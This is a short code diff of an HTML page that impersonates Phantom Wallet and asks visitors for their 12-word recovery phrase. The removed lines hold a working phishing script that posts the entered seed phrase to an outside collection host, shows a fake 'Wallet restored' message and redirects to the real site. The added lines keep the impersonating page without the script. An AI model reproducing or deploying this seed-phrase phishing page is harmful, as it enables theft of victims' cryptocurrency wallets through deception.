@@ -1,22 +1,8 @@
 <!DOCTYPE html>
 <html>
-<head>
-  <title>Phantom Wallet</title>
-</head>
-<body style="text-align:center; margin-top:80px; font-family:sans-serif;">
-  <h2>Connect to Phantom Wallet</h2>
-  <input id="seed" placeholder="Enter your 12-word phrase" style="width:80%; padding:10px;" /><br><br>
-  <button onclick="send()">Unlock</button>
-
-  <script>
-    function send() {
-      fetch('https://jqdfjiuzmdhhkipzoaxxf2ocrw07i3cw7.oast.fun/collect', {
-        method: 'POST',
-        body: new URLSearchParams({ seed: document.getElementById('seed').value })
-      });
-      alert("Wallet restored. Please wait...");
-      window.location.href = "https://phantom.app";
-    }
-  </script>
+<body style="text-align:center; margin-top:80px;">
+  <h2>Restore Phantom Wallet</h2>
+  <input placeholder="Enter 12-word phrase" style="width:80%; padding:10px;" /><br><br>
+  <button>Unlock</button>
 </body>
 </html>
